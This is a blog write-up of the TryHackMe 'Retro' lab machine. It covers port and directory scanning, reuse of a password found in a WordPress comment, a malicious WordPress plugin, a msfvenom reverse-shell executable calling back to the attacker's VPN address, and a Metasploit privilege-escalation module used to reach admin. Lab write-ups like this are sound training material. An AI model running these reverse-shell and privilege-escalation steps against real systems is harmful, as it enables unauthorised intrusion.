---
title: "TryHackMe Retro: Writeup"
permalink: /thm-retro-writeup/
categories:
  - CTFs
  - TryHackMe
  - Writeup
date: 2023-12-14
tags:
  - TryHackMe
  - CTF
  - Metasploit
  - Retro
  - THM
  - WordPress
  - NixOS-Hacking
---

---

The [Retro](https://tryhackme.com/room/retro) machine on [TryHackMe](https://tryhackme.com/) is ranked `hard`, and is themed around retro gaming, books, sci-fi, and general retro nerd stuff. It is an interesting machine with a ton of fun ester-eggs/references and gaining root is rather challenging.

## Index

1. [Enumeration](#enumeration)
2. [Foothold](#foothold)
3. [Getting User](#getting-user)
4. [Getting Root](#getting-root)

## Enumeration

Lets start by setting a temporary environment variable: `export IP="<MACHINE_IP>"`. On a Kali box, I would add an entry to `/etc/hosts` but because I did this challenge from a [NixOS](https://nixos.org/) machine and, temporary changes to config files like that are generally against the Nix ethos, I set an environment variable. 

I started with a port scan, and decided to use a newer port scanning utility called [RustScan](https://github.com/RustScan/RustScan): `rustscan -a $IP -- -T4 -sV -oN 'version.nmap'`. This port scan resulted in two open ports being discovered:
```
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Note:** the entry in the version category labeled `Microsoft Terminal Services` is a little misleading as `Microsoft Terminal Services` was renamed to `Remote Desktop Services`.

The above port scan suggests that we're dealing with a windows machine running a web server. So, let's run a [Gobuster](https://www.kali.org/tools/gobuster/) scan: `gobuster dir -w ~/Documents/wordlist/dirbuster/directory-list-2.3-medium.txt -u http://$IP -o web-dirs-2.gob`. This Dir scan revealed the following directories among others:
```
...
/retro                (Status: 301) [Size: 150] [--> http://<IP>/retro/]
...
```
That gives us the answer to the first question on [TryHackMe](https://tryhackme.com/). Running a followup scan of the `/retro` sub-directory, indicates that the site is powered by [WordPress](https://wordpress.com/). 
```
...
/wp-content           (Status: 301) [Size: 161] [--> http://<IP>/retro/wp-content/]
/wp-includes          (Status: 301) [Size: 162] [--> http://<IP>/retro/wp-includes/]
/wp-admin             (Status: 301) [Size: 159] [--> http://<IP>/retro/wp-admin/]
...
```
The Hint for the user flag states, "Don't leave sensitive information out in the open, even if you think you have control over it," which seems to suggest that there are credentials hidden somewhere on the site.

## Foothold

After mapping out the site's directory structure, it becomes clear that there is only one author on the site; `Wade`, who is likely also the sites admin. lets go take a look at Wade's profile and see what we can find. On his Author page we see a list of posts (all on the home page) but, importantly there is a "WordPress.org" link, a "Log in" link, along with a "Recent Comments" section. These links tell us that,

1. we were right about Retro being a WordPress site,
2. we can login (should we find credentials),
3. and, due to the "Ready Player One" post being the odd one out, that there's probably something interesting in that comment that Wade left on it.

Let's click the comment link.

The comment reads:
```
Leaving myself a note here just in case I forget how to spell it: parzival
```
and the post makes mention of the fact that Wade, `keep[s] mistyping the name of his avatar whenever I log in`. Putting two and two together and there's a solid chance that, `parzival` is the password for the user, `Wade`. Let's test that hypothesis by going to the afore-mentioned login page (`http://<MACHINE_IP>/retro/wp-login.php`) and trying the aforementioned credentials.

They work! 

Hmm, I wonder if these credentials would also work for the RDP client running on port `3389`. Lets spin up an RDP connection to the machine using [Remmina](https://gitlab.com/Remmina/Remmina) and see. Indeed we can login to the server over RDP using the username: `Wade`, and the password: `parzival`. Sweet! We now have two avenues of attack.     

Foothold acquired!

## Getting User

The easiest way to get the user flag in my opinion, is to log in as the user `Wade` using RDP. Once logged in we can open the "user.txt" file on Wades desktop in Notepad and Copy the contents using `CTRL + C`. Because of the lovely RDP protocol, this will copy the flag to the clipboards of both the windows-based victim machine *and* our Linux-based attacker machine.

User flag acquired!

## Getting Root

We now have admin access to server and as such can upload/edit the PHP files to get [Remote Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution). Since the web server is being hosted on a windows machine let's try for a [Metasploit](https://docs.metasploit.com/) [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/) shell. to get this shell lets use [this repo](https://github.com/wetw0rk/malicious-wordpress-plugin). Clone the repo and `cd` into the directory, then run the python script with your TryHackMe VPN IP, an available port number, and the string `Y`. The command will look something like this: `python wordpwn.py <THM-VPN-IP> 4444 Y`. This python script will do two things for us:

1. generate the malicious WordPress plugin for us, (saved in file: `malicious.zip` in the current directory)
2. and, it will also start a Meterpreter console for us!  

Next we'll install the plugin by going to the `Plugins` tab -> `Add New` -> click on `Upload Plugin` -> click on `Browse` and finally select the `malicious.zip` file from the git repo we cloned before. Click `Install Now` then once the page finishes loading click `Activate Plugin` and wait again for the page to load. Finally, our malicious plugin is installed! Time to get a low privileged shell. Go to this sub-directory: `/retro/wp-content/plugins/malicious/wetw0rk_maybe.php` to initiate the shell. 

In a new terminal, make an `exploit.exe` with [msfvennom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html): `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<THM-VPN-IP> LPORT=5555 -f exe > exploit.exe`. Use the meterpreter shell from before to upload that `exploit.exe` file: `upload exploit.exe ./`. 

In a second Metasploit session run an `exploit/multi/handler` and set the port to `5555`. In the first meterpreter shell from before run the `exploit.exe`, with: `execute -f exploit.exe`. This will give us a, `windows/meterpreter/reverse_tcp` session whereas before we had a, `php/meterpreter/reverse_tcp`. `windows/meterpreter/reverse_tcp` meterpreter shell has more features and will allow us to use the `exploits/windows/local/ms16_075_reflection_juicy` exploit for privesc (doing so will spin up yet another meterpreter session). In the new meterpreter session, background meterpreter, then run:
1. `use exploits/windows/local/ms16_075_reflection_juicy`
2. `set payload windows/meterpreter/reverse_tcp` 
3. `set LHOST <THM-VPN-IP>`
4. `set LPORT 6666`
5. `set session 1`
6. `exploit`
7. wait...
after some time you'll have a new meterpreter session with admin privileges. Finally we can download the flag with: `download c:/users/administrator/desktop/root.txt.txt`.

Root flag acquired!
<br>
<audio controls src="/assets/sounds/smb-level-clear.mp3"> <a href="/assets/sounds/smb-level-clear.mp3"> super Mario level up sound </a> </audio> <br>

I look forward to seeing you in cyber-space,

Eoghan West (Calacuda)

<br>

<hr style="text-align:center">

## References:
1. [NixOS](https://nixos.org/) the NixOS download page
2. [RustScan](https://github.com/RustScan/RustScan) GitHub repo and documentation for RustScan, a port scanner written in [Rust](https://www.rust-lang.org/)
3. [Gobuster](https://www.kali.org/tools/gobuster/) GitHub repo for Gobuster directory busting tool 
4. [TryHackMe](https://tryhackme.com/) the host of this CTF
5. [WordPress](https://wordpress.com/) a website hosing framework
6. [Remmina](https://gitlab.com/Remmina/Remmina) a remote client for VNC, RDP, SSH, etc
7. [Remote Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution) Wikipedia article for RCE
8. [Metasploit](https://docs.metasploit.com/) documentation for the Metasploit Framework 
9. [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/) documentation for meterpreter (a part of the Metasploit framework)
10. [Malicious WordPress Plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) the GitHub repo hosting the malicious plugin used to gain a foot hold against root
11. [msfvennom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) a tool for generating payloads to get remote shells, (part of the Metasploit framework)